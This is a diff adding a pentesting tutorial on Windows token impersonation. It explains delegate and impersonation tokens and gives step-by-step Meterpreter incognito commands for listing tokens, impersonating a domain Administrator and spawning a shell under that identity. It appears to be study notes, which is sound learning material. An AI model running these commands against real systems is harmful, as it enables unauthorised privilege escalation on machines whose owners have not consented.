@@ -1,3 +1,80 @@
+# Token Impersonation (Windows Privilege Escalation)
+
+### 🔑 What is a Token?
+
+A **token** in Windows is like a **web cookie** — it temporarily grants access so a user doesn't need to re-enter credentials every time they access files or resources.
+
+### 🧠 Types of Tokens
+
+1. **Delegate Token**
+    - Created during **interactive logins**
+    - Example: When you log in via **Remote Desktop (RDP)** or directly at the machine
+2. **Impersonation Token**
+    - Created during **non-interactive logins**
+    - Example: When you map a network drive or run a logon script
+
+## **Step-by-Step Exploitation**
+
+### **1. Get a Meterpreter Shell**
+
+First establish a foothold on the target machine.
+
+> ⚠️ Requires Meterpreter from Metasploit
+> 
+
+### **2. Load Incognito Module**
+
+```
+use incognito
+```
+
+### **3. List Available Tokens**
+
+- **List available tokens:** `list_tokens -u`
+- Look for **delegation** or **impersonation** tokens (especially those of admin/system users)
+
+```
+list_tokens -u
+```
+
+Example output:
+
+```
+Delegation Tokens Available
+========================================
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+SNEAKS.IN\Administrator
+
+Impersonation Tokens Available
+========================================
+NT AUTHORITY\ANONYMOUS LOGON
+```
+
+### **4. Impersonate a Privileged Token**
+
+```
+impersonate_token SNEAKS.IN\\Administrator
+```
+
+*Note:* Use double backslashes (**`\\`**) in the username
+
+### **5. Verify Your New Identity**
+
+```
+getuid
+```
+
+### **6. Get a Shell with New Privileges**
+
+```
+shell
+whoami
+```
+
+You should now be running as the impersonated user!
+
 
 # 🥔 Juicy Potato — Privilege Escalation via SeImpersonatePrivilege
 
